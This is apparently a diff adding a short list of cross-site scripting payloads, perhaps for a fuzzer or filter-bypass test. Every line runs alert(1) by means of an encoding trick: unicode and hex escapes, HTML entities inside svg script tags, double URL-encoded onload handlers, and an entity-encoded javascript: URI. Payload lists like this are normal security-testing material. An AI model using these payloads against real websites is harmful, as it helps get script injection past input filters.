@@ -1,0 +1,14 @@
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+\’-alert(1)//
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
